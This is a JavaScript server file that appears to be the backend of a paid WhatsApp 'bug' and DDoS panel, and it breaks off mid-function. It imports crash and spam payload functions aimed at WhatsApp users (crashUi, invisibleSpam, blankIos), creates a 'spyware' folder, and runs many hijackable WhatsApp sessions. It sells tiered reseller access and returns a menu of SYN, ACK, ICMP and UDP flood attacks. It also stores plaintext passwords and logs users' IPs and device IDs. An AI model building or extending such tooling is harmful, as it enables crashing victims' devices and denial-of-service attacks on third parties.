const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
const chalk = require('chalk');

function formatTimestamp() {
  const now = new Date();
  const date = now.getDate().toString().padStart(2, '0');
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const year = now.getFullYear();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  return `[${date}/${month}/${year} | ${hours}:${minutes}:${seconds}]`;
}

function logConnection(message) {
  console.log(chalk.green(`${formatTimestamp()} #[ ell ] >   CONNECTION: ${message}`));
}

function logDisconnect(message) {
  console.log(chalk.yellow(`${formatTimestamp()} #[ ell ] >  DISCONNECT: ${message}`));
}

function logError(message, error) {
  console.log(chalk.red(`${formatTimestamp()} #[ ell ] >  ERROR: ${message}`));
  if (error) console.log(chalk.red(error.stack || error));
}

function logSuccess(message) {
  console.log(chalk.cyan(`${formatTimestamp()} #[ ell ] >  SUCCESS: ${message}`));
}

function logInfo(message) {
  console.log(chalk.blue(`${formatTimestamp()} #[ ell ] >  INFO: ${message}`));
}

function logWarning(message) {
  console.log(chalk.yellow(`${formatTimestamp()} #[ ell ] >  WARNING: ${message}`));
}

process.on('unhandledRejection', (reason, promise) => {
  logError('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  logError('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed')
  )) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed')
  )) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const {
  docIos, rpnm, invisibleSpam, DelayCarousel, blankIos, PlainCall, crashUi, AndroXIos, dongzer 
} = require("./database/function.js");

const { OWNER_ID, TOKEN, PORT, WSPORT, bugs, tqto, listDDoS, news } = require('./config.js');
const { ToolsController, sesionKey } = require("./tools/tgtools");
const VPSController = require("./tools/vps");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessage,
  areJidsSameUser,
  WAMessageStatus,
  AuthenticationState,
  GroupMetadata,
  getContentType,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("@whiskeysockets/baileys");

const express = require("express");
const crypto = require("crypto");
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino');
const axios = require('axios');
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const multer = require('multer');
const fsExtra = require('fs');
const cors = require('cors');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true, perMessageDeflate: false });

// MIDDLEWARE - WAJIB DI SINI, SEBELUM APAPUN!
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

const DATABASE_DIR = path.join(__dirname, 'database');
const DB_PATH = path.join(DATABASE_DIR, "database.json");
const KEY_FILE = path.join(DATABASE_DIR, 'keyList.json');
const LOG_FILE = path.join(DATABASE_DIR, 'logUser.txt');
const ADMINS_FILE = path.join(__dirname, 'database', 'admins.json');
const DATA_FILE = './database/chat_data.json';
const databasePath = path.join(__dirname, 'database');
const safeExit = process.exit;
const activeConnections = {};
const biz = {};
const mess = {};
const deviceConnections = new Map();
const clients = new Map();
const rateLimitMap = {};
const spamCooldown = {};
const cooldowns = {};
let sikmanuk = [];
let activeKeys = {};
let usePairingCode = true;

if (!fs.existsSync('./database/spyware')) fs.mkdirSync('./database/spyware');

function loadKeyList() {
  try {
    if (fs.existsSync(KEY_FILE)) {
      return JSON.parse(fs.readFileSync(KEY_FILE, 'utf8'));
    }
    return [];
  } catch (error) {
    logError('Load key list error:', error);
    return [];
  }
}

function saveKeyList(list) {
  try {
    fs.writeFileSync(KEY_FILE, JSON.stringify(list, null, 2));
    logSuccess('Key list saved');
  } catch (error) {
    logError('Save key list error:', error);
  }
}

function loadDatabase() {
  try {
    if (!fs.existsSync(DB_PATH)) {
      fs.writeFileSync(DB_PATH, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
  } catch (error) {
    logError('Load database error:', error);
    return [];
  }
}

function saveDatabase(data) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    logError('Save database error:', error);
    return false;
  }
}

function loadAdmins() {
  try {
    if (!fs.existsSync(ADMINS_FILE)) {
      const defaultData = { owners: [], admins: [], resellers: [] };
      fs.writeFileSync(ADMINS_FILE, JSON.stringify(defaultData, null, 2));
      return defaultData;
    }
    return JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
  } catch (error) {
    logError('Load admins error:', error);
    return { owners: [], admins: [], resellers: [] };
  }
}

function saveAdmins(data) {
  try {
    const dir = path.dirname(ADMINS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(data, null, 2));
    logSuccess('Admins saved');
    return true;
  } catch (error) {
    logError('Save admins error:', error);
    return false;
  }
}

function readMessages() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
    return { messages: [], messageIdCounter: 1 };
  } catch (error) {
    logError('Read messages error:', error);
    return { messages: [], messageIdCounter: 1 };
  }
}

function writeMessages(data) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    logError('Write messages error:', error);
  }
}

function readBotUsers() {
  try {
    const botUsersFile = './botUsers.json';
    if (!fs.existsSync(botUsersFile)) {
      return [];
    }
    return JSON.parse(fs.readFileSync(botUsersFile, 'utf8'));
  } catch (error) {
    logError('Read bot users error:', error);
    return [];
  }
}

function writeBotUsers(users) {
  try {
    const botUsersFile = './botUsers.json';
    fs.writeFileSync(botUsersFile, JSON.stringify(users, null, 2));
    logSuccess('Bot users saved');
    return true;
  } catch (error) {
    logError('Write bot users error:', error);
    return false;
  }
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function isExpired(user) {
  return new Date(user.expiredDate) < new Date();
}

function isDeveloper(userId) {
  return OWNER_ID.includes(Number(userId));
}

function isOwner(userId) {
  const data = loadAdmins();
  return data.owners.includes(Number(userId));
}

function isAdmin(userId) {
  const data = loadAdmins();
  return data.admins.includes(Number(userId));
}

function isReseller(userId) {
  const data = loadAdmins();
  return data.resellers.includes(Number(userId));
}

function hasAccess(userId) {
  return isDeveloper(userId) || isOwner(userId) || isAdmin(userId) || isReseller(userId);
}

function getUserStatus(userId) {
  if (isDeveloper(userId)) return "Developer";
  if (isOwner(userId)) return "Owner";
  if (isAdmin(userId)) return "Admin";
  if (isReseller(userId)) return "Reseller";
  return "No Access";
}

function getNextId() {
  const data = readMessages();
  const nextId = data.messageIdCounter;
  data.messageIdCounter++;
  writeMessages(data);
  return nextId;
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo?.username);
  return user ? keyInfo.username : null;
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, role, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, role, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
  logInfo(`Key recorded for user: ${username}, IP: ${ip}`);
}

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('session', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({ sessionName: sessionName });
    }
  }

  return activeCreds;
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('session', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch (error) {
    logError('Detect WA type error:', error);
    return "Unknown";
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;
  const requiredKeys = ['noiseKey', 'signedIdentityKey', 'signedPreKey', 'registrationId', 'advSecretKey', 'signalIdentities'];
  return requiredKeys.every(key => key in jsonData);
}

function checkDeletePermission(deleterId, targetUser) {
  if (!hasAccess(deleterId)) return false;
  const deleterRole = getUserStatus(deleterId);
  const targetRole = targetUser.role;
  if (isDeveloper(deleterId)) return true;
  if (isOwner(deleterId)) {
    if (targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isAdmin(deleterId)) {
    if (targetRole === 'admin' || targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isReseller(deleterId)) {
    return targetRole === 'member';
  }
  return false;
}

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function waiting(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(response.data);
  } catch (error) {
    logError('Download to buffer error:', error);
    throw error;
  }
}

function sendToGroups(text, options = {}) {
  for (const groupid of ID_GROUP) {
    bot.sendMessage(groupid, text, options).catch(() => {});
  }
}

function sendToGroupsUtama(text, options = {}) {
  for (const groupid of ID_GROUP_UTAMA) {
    bot.sendMessage(groupid, text, options).catch(() => {});
  }
}

function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    logWarning(`Rate limit exceeded for key: ${key}`);
    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

function prepareAuthFolders() {
  const userId = "session";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    logSuccess(`Prepared ${files.length} auth folders`);
    return files;
  } catch (err) {
    logError('Prepare auth folders error:', err);
    safeExit();
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      logConnection(`Connecting session: ${sessionName}`);
      const sessionsFold = `${folderPath}/${sessionName}`;
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        printQRInTerminal: !usePairingCode,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        generateHighQualityLinkPreview: true,
        patchMessageBeforeSending: (message) => {
          const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
          if (requiresPatch) {
            message = {
              viewOnceMessage: {
                message: {
                  messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
                  ...message
                }
              }
            };
          }
          return message;
        },
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        logger: pino({ level: 'fatal' }),
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
        }
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          logSuccess(`Session connected: ${sessionName} (${type})`);
          resolve();
        } else if (connection === "close") {
          if (statusCode === 440) {
            logDisconnect(`Session closed (conflict): ${sessionName}`);
            delete activeConnections[sessionName];
            fs.rmSync(sessionsFold, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            logDisconnect(`Session closed, retrying (${retries-1} left): ${sessionName}`);
            await waiting(3000);
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logDisconnect(`Session closed permanently: ${sessionName}`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logError(`Connect session error for ${sessionName}:`, err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  logInfo('Disconnecting all active connections...');
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logDisconnect(`Disconnected: ${sessionName}`);
    } catch (error) {
      logError(`Error disconnecting ${sessionName}:`, error);
    }
    delete activeConnections[sessionName];
  }
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "session";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  logInfo('Refreshing user sessions...');
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    logError(`Pairing failed after ${attempt} attempts for ${number}`);
    return false;
  }
  
  logInfo(`Pairing attempt ${attempt} for ${number}`);
  const sessionDir = path.join('session', owner, number);

  if (!fs.existsSync('session')) fs.mkdirSync('session');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    printQRInTerminal: !usePairingCode,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true,
    patchMessageBeforeSending: (message) => {
      const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
      if (requiresPatch) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
              ...message
            }
          }
        };
      }
      return message;
    },
    version: version,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    logger: pino({ level: 'fatal' }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
    }
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        logDisconnect(`Pairing closed, retrying for ${number}`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        logDisconnect(`Pairing logged out for ${number}`);
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      logSuccess(`Pairing successful for ${number}`);
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('session', owner, `${number}.json`);

      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          logSuccess(`Saved credentials for ${number}`);
        }
      } catch (error) {
        logError(`Error saving credentials for ${number}:`, error);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  logInfo('Starting user sessions...');
  const sessionPath = path.join(__dirname, 'session');
  if (!fs.existsSync(sessionPath)) {
    fs.mkdirSync(sessionPath, { recursive: true });
    logInfo('Created session directory');
    return;
  }

  const subfolders = fs.readdirSync(sessionPath)
    .map(name => path.join(sessionPath, name))
    .filter(p => fs.lstatSync(p).isDirectory());

  logInfo(`Found ${subfolders.length} session folders`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        continue;
      }

      try {
        await connectSession(folder, sessionName);
      } catch (error) {
        logError(`Error starting session ${sessionName}:`, error);
      }
    }
  }
}

async function handleUserManagement(msg, input, type, action) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (type === 'owner' && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Only developer!");
  }
  
  if (type === 'admin' && !isOwner(userId) && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Only owner/developer!");
  }
  
  if (type === 'reseller' && !isOwner(userId) && !isAdmin(userId) && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ No permission!");
  }
  
  let targetUser;
  let fullName = '';
  
  if (msg.reply_to_message) {
    targetUser = msg.reply_to_message.from.id;
    fullName = [msg.reply_to_message.from.first_name, msg.reply_to_message.from.last_name].filter(Boolean).join(' ');
  } else if (input?.startsWith('@')) {
    try {
      const member = await bot.getChatMember(chatId, input);
      targetUser = member.user.id;
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      return bot.sendMessage(chatId, "❌ Username invalid!");
    }
  } else if (input && !isNaN(input)) {
    targetUser = Number(input);
    try {
      const member = await bot.getChatMember(chatId, targetUser);
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      fullName = targetUser.toString();
    }
  } else return;
  
  if (!fullName) fullName = targetUser.toString();
  
  const data = loadAdmins();
  const key = type === 'owner' ? 'owners' : type === 'admin' ? 'admins' : 'resellers';
  data[key] = data[key].map(id => Number(id));
  
  const isAdd = action.toLowerCase() === 'add';
  const exists = data[key].includes(targetUser);
  
  if ((isAdd && exists) || (!isAdd && !exists)) return;
  
  if (isAdd) {
    data[key].push(targetUser);
    logInfo(`${type} added: ${targetUser} (${fullName})`);
  } else {
    data[key] = data[key].filter(id => id !== targetUser);
    logInfo(`${type} removed: ${targetUser} (${fullName})`);
  }
  
  saveAdmins(data);
  
  bot.sendMessage(chatId, `[${fullName}](tg://user?id=${targetUser}) ${type.toUpperCase()} berhasil ${isAdd ? 'ditambahkan' : 'dihapus'}`, {
    parse_mode: 'Markdown',
    reply_to_message_id: msg.message_id
  });
}

if (fs.existsSync(KEY_FILE)) {
  try {
    sikmanuk = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
    for (const user of sikmanuk) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;
        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }
    logSuccess(`Loaded ${sikmanuk.length} keys from file`);
  } catch (err) {
    logError('Error loading key file:', err);
  }
}

fs.watchFile(KEY_FILE, () => {
  try {
    sikmanuk = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
    logInfo('Key file updated');
  } catch (error) {
    logError('Error watching key file:', error);
  }
});

const bot = new TelegramBot(TOKEN, { polling: false });
const ID_GROUP = [OWNER_ID];
const ID_GROUP_UTAMA = [OWNER_ID];

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = file.fieldname === 'video' ? 'uploads/video' : 'uploads/images';
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
    cb(null, uniqueName);
  }
});
const upload = multer({ storage });
app.use('/uploads', express.static('uploads'));
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);
  
  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };
  sesionKey[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };
  
  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  logSuccess(`User validated: ${username}`);

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    listDDoS,
    news
  });
});

app.get("/getBugList", (req, res) => {
  const { key } = req.query;
  return res.json({ status: true, data: bugs });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);

  if (!userKey) {
    return res.json({ valid: false, reason: "session" });
  }
  if (userKey.androidId !== androidId) {
    return res.json({ valid: false, reason: "device" });
  }
  if (!user) {
    return res.json({ valid: false });
  }
  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }
  
  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });
  
  sesionKey[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };
  
  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    listDDoS: [
      { ddos_id: "s-gbps", ddos_name: "SYN High GBPS" },
      { ddos_id: "s-pps", ddos_name: "SYN Traffic Flood" },
      { ddos_id: "a-gbps", ddos_name: "ACK High GBPS" },
      { ddos_id: "a-pps", ddos_name: "ACK Traffic Flood" },
      { ddos_id: "icmp", ddos_name: "ICMP Flood" },
      { ddos_id: "udp", ddos_name: "GUDP ( HIGH RISK )" }
    ],
    news: news
  });
});

app.get("/getKey", (req, res) => {
  const { username } = req.query;
  const keyList = loadKeyList();
  const x = keyList.find(e => e.username === username);
  if (x) {
    return res.json({ status: true, key: x.sessionKey });
  } else {
    return res.json({ status: false });
  }
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  logInfo(`Password changed for user: ${username}`);
  return res.json({ success: true, message: "Password updated successfully" });
});

// ==========================================
// API PROXY ANIME (MENYESUAIKAN LINK DART)
// ==========================================

const animeHeaders = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'Referer': 'https://www.sankavollerei.com/'
};

// 1. Home
app.get('/anime/home', async (req, res) => {
    try {
        const { data } = await axios.get('https://www.sankavollerei.com/anime/home', { headers: animeHeaders });
        res.json(data);
    } catch (err) { res.status(500).json({ error: "Gagal" }); }
});

// 2. Search
app.get('/anime/search/:query', async (req, res) => {
    try {
        const { data } = await axios.get(`https://www.sankavollerei.com/anime/search/${req.params.query}`, { headers: animeHeaders });
        res.json(data);
    } catch (err) { res.status(500).json({ error: "Gagal" }); }
});

// 3. Detail Anime (Perhatikan ini /anime/anime/:slug)
app.get('/anime/anime/:slug', async (req, res) => {
    try {
        const { data } = await axios.get(`https://www.sankavollerei.com/anime/anime/${req.params.slug}`, { headers: animeHeaders });
        res.json(data);
    } catch (err) { res.status(500).json({ error: "Gagal" }); }
});

// 4. List Genre
app.get('/anime/genre', async (req, res) => {
    try {
        const { data } = await axios.get('https://www.sankavollerei.com/anime/genre/', { headers: animeHeaders });
        res.json(data);
    } catch (err) { res.status(500).json({ error: "Gagal" }); }
});

// 5. Detail Genre
app.get('/anime/genre/:slug', async (req, res) => {
    try {
        const page = req.query.page || 1;
        const { data } = await axios.get(`https://www.sankavollerei.com/anime/genre/${req.params.slug}?page=${page}`, { headers: animeHeaders });
        res.json(data);
    } catch (err) { res.status(500).json({ error: "Gagal" }); }
});

// 6. Schedule
app.get('/anime/schedule', async (req, res) => {
    try {
        const { data } = await axios.get('https://www.sankavollerei.com/anime/schedule', { headers: animeHeaders });
        res.json(data);
    } catch (err) { res.status(500).json({ error: "Gagal" }); }
});

// 7. Episode
app.get('/anime/episode/:slug', async (req, res) => {
    try {
        const { data } = await axios.get(`https://www.sankavollerei.com/anime/episode/${req.params.slug}`, { headers: animeHeaders });
        res.json(data);
    } catch (err) { res.status(500).json({ error: "Gagal" }); }
});

// ==================== ENDPOINT BARU ====================

// 8. ALL ANIME - Semua Anime
// ==================== ALL ANIME FULL - TANPA BATAS! ====================
// 8. ALL ANIME FULL - TANPA BATAS!
app.get('/anime/unlimited', async (req, res) => {
    try {
        console.log('📡 Fetching unlimited anime dari API asli...');
        // Langsung nembak rute asli dari web sankavollerei
        const { data } = await axios.get('https://www.sankavollerei.com/anime/unlimited', { headers: animeHeaders });
        res.json(data);
    } catch (err) { 
        console.error('❌ ERROR FATAL:', err.message);
        res.status(500).json({ error: "Gagal ambil semua anime", details: err.message }); 
    }
});

// 9. ONGOING ANIME dengan Pagination
app.get('/anime/ongoing-anime', async (req, res) => {
    try {
        const page = parseInt(req.query.page) || 1;
        const limit = 20;
        
        console.log(`📡 Fetching ongoing anime page ${page}...`);
        
        const homeResponse = await axios.get('https://www.sankavollerei.com/anime/home', { headers: animeHeaders });
        const homeData = homeResponse.data;
        
        let ongoingList = homeData.data?.ongoing?.animeList || [];
        
        const startIndex = (page - 1) * limit;
        const endIndex = startIndex + limit;
        const paginatedList = ongoingList.slice(startIndex, endIndex);
        
        const totalPages = Math.ceil(ongoingList.length / limit);
        
        res.json({
            status: "success",
            creator: "Sanka Vollerei",
            statusCode: 200,
            data: {
                animeList: paginatedList,
                pagination: {
                    current_page: page,
                    last_visible_page: totalPages,
                    has_next_page: page < totalPages,
                    has_previous_page: page > 1,
                    total: ongoingList.length
                }
            }
        });
        
    } catch (err) { 
